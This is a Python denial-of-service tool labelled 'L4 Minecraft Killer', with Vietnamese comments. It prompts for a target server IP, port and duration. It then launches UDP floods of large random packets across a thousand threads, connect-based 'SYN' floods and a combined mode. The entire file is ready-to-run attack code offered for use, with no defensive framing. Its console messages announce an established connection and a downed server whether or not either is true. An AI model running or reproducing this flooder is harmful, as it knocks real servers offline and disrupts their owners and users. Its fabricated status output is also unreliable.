#!/usr/bin/env python3
# ==++==
# L4 MINECRAFT KILLER - QUÂN DEV
# TỐC ĐỘ CAO - GÓI TIN NẶNG - ĐỐT SERVER
# ==++==

import socket
import threading
import random
import time
import os
import sys
from collections import defaultdict

# ==================== CẤU HÌNH ====================
THREADS = 1000                     # Số luồng tấn công
SOCKETS_PER_THREAD = 200           # Socket mỗi luồng
PACKET_SIZE = 65507                # Max UDP size
USE_NO_DELAY = True

# Màu sắc
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# ==================== TẠO PACKET NGẪU NHIÊN ====================
def random_packet(min_size=64, max_size=PACKET_SIZE):
    size = random.randint(min_size, max_size)
    return os.urandom(size)

def heavy_packet():
    """Gói tin siêu nặng 65KB"""
    return os.urandom(PACKET_SIZE)

def minecraft_packet():
    """Giả lập packet Minecraft"""
    packet_types = [0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F]
    size = random.randint(64, 4096)
    packet = bytearray(size)
    packet[0] = random.choice(packet_types)
    for i in range(1, size):
        packet[i] = random.randint(0, 255)
    return bytes(packet)

def syn_packet():
    """Giả lập TCP SYN packet"""
    return b'\x02' + os.urandom(random.randint(40, 1500))

# ==================== PACKET POOL ====================
HEAVY_PACKETS = [heavy_packet() for _ in range(10)]
MEDIUM_PACKETS = [random_packet(1024, 8192) for _ in range(50)]
SMALL_PACKETS = [random_packet(64, 512) for _ in range(100)]
MINECRAFT_PACKETS = [minecraft_packet() for _ in range(50)]

# ==================== COUNTER ====================
class Counter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()
    
    def add(self, x=1):
        with self.lock:
            self.value += x
    
    def get_and_reset(self):
        with self.lock:
            val = self.value
            self.value = 0
            return val

packet_counter = Counter()
byte_counter = Counter()

# ==================== ATTACK THREAD ====================
def attack_thread(ip, port, duration):
    """Luồng tấn công chính"""
    # Tạo socket pool
    sockets = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.001)
            if USE_NO_DELAY:
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sockets.append(sock)
        except:
            pass
    
    if not sockets:
        return
    
    addr = (ip, port)
    end_time = time.time() + duration
    packet_idx = 0
    
    while time.time() < end_time:
        for sock in sockets:
            try:
                # Gửi nhiều packet cùng lúc
                for _ in range(10):
                    # Chọn packet ngẫu nhiên
                    packet_type = random.randint(0, 3)
                    
                    if packet_type == 0:
                        packet = HEAVY_PACKETS[packet_idx % len(HEAVY_PACKETS)]
                    elif packet_type == 1:
                        packet = MEDIUM_PACKETS[packet_idx % len(MEDIUM_PACKETS)]
                    elif packet_type == 2:
                        packet = SMALL_PACKETS[packet_idx % len(SMALL_PACKETS)]
                    else:
                        packet = MINECRAFT_PACKETS[packet_idx % len(MINECRAFT_PACKETS)]
                    
                    sock.sendto(packet, addr)
                    packet_counter.add(1)
                    byte_counter.add(len(packet))
                    packet_idx += 1
                    
            except:
                pass

# ==================== UDP FLOOD NHIỀU LUỒNG ====================
def udp_flood(ip, port, duration):
    """UDP Flood tốc độ cao"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    addr = (ip, port)
    end_time = time.time() + duration
    
    packets = HEAVY_PACKETS + MEDIUM_PACKETS + SMALL_PACKETS
    
    while time.time() < end_time:
        for packet in packets:
            try:
                sock.sendto(packet, addr)
                packet_counter.add(1)
                byte_counter.add(len(packet))
            except:
                pass

# ==================== TCP SYN FLOOD ====================
def tcp_syn_flood(ip, port, duration):
    """TCP SYN Flood"""
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.001)
            sock.connect((ip, port))
            sock.send(syn_packet())
            packet_counter.add(1)
            sock.close()
        except:
            pass

# ==================== MAIN ====================
def main():
    print(f"""
{Colors.PURPLE}
╔══════════════════════════════════════════════════════╗
║         L4 MINECRAFT KILLER - QUÂN DEV              ║
║      TỐC ĐỘ CAO - GÓI TIN NẶNG - ĐỐT SERVER         ║
╚══════════════════════════════════════════════════════╝
{Colors.RESET}
    """)
    
    # Nhập thông tin
    server_ip = input(f"{Colors.CYAN}[?] Enter Server IP: {Colors.RESET}").strip()
    if not server_ip:
        print(f"{Colors.RED}[-] No IP entered!{Colors.RESET}")
        return
    
    port_input = input(f"{Colors.CYAN}[?] Enter Port (default 25565): {Colors.RESET}").strip()
    port = int(port_input) if port_input else 25565
    
    duration_input = input(f"{Colors.CYAN}[?] Attack duration (seconds, default 60): {Colors.RESET}").strip()
    duration = int(duration_input) if duration_input else 60
    
    # Chọn mode
    print(f"""
{Colors.YELLOW}[!] Select attack mode:{Colors.RESET}
  1. UDP Flood (mặc định - nhanh nhất)
  2. TCP SYN Flood
  3. UDP + TCP (hỗn hợp)
  4. Super Flood (tất cả)
    """)
    mode_input = input(f"{Colors.CYAN}[?] Mode: {Colors.RESET}").strip()
    mode = int(mode_input) if mode_input else 1
    
    print(f"\n{Colors.GREEN}[+] Resolving IP...{Colors.RESET}")
    
    # Resolve domain nếu cần
    import socket as socklib
    try:
        ip = socklib.gethostbyname(server_ip)
        print(f"{Colors.GREEN}[+] IP resolved: {ip}{Colors.RESET}")
    except:
        ip = server_ip
        print(f"{Colors.GREEN}[+] Using IP: {ip}{Colors.RESET}")
    
    print(f"{Colors.GREEN}[+] Establishing connection...{Colors.RESET}")
    time.sleep(0.5)
    print(f"{Colors.GREEN}[+] Connection established.{Colors.RESET}")
    print(f"{Colors.PURPLE}[+] Initiating attack on {server_ip}{Colors.RESET}\n")
    
    # Bắt đầu tấn công
    threads = []
    
    if mode == 1:
        # UDP Flood
        for _ in range(THREADS):
            t = threading.Thread(target=udp_flood, args=(ip, port, duration))
            t.start()
            threads.append(t)
            
    elif mode == 2:
        # TCP SYN Flood
        for _ in range(THREADS // 10):
            t = threading.Thread(target=tcp_syn_flood, args=(ip, port, duration))
            t.start()
            threads.append(t)
            
    elif mode == 3:
        # UDP + TCP
        for _ in range(THREADS):
            t = threading.Thread(target=udp_flood, args=(ip, port, duration))
            t.start()
            threads.append(t)
        for _ in range(THREADS // 10):
            t = threading.Thread(target=tcp_syn_flood, args=(ip, port, duration))
            t.start()
            threads.append(t)
            
    else:
        # Super Flood - Nhiều luồng attack_thread
        for _ in range(THREADS):
            t = threading.Thread(target=attack_thread, args=(ip, port, duration))
            t.start()
            threads.append(t)
    
    # Hiển thị stats
    last_print = time.time()
    start_time = time.time()
    
    try:
        while any(t.is_alive() for t in threads):
            now = time.time()
            if now - last_print >= 1:
                elapsed = int(now - start_time)
                remaining = duration - elapsed
                
                pps = packet_counter.get_and_reset()
                bytes_sent = byte_counter.get_and_reset()
                mbps = (bytes_sent * 8) / 1000000
                
                print(f"\r{Colors.CYAN}[📊] Packets: {pps:,} | Speed: {mbps:.2f} Mbps | Time: {elapsed}/{duration}s{Colors.RESET}", end="")
                last_print = now
                
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted!{Colors.RESET}")
    
    # Kết thúc
    print(f"\n\n{Colors.RED}[+] Attack completed.{Colors.RESET}")
    print(f"{Colors.RED}Server {server_ip} is down.{Colors.RESET}")
    print(f"{Colors.YELLOW}(+) Total packets sent: {packet_counter.get_and_reset():,}{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Connection closed.{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exiting...{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[-] Error: {e}{Colors.RESET}")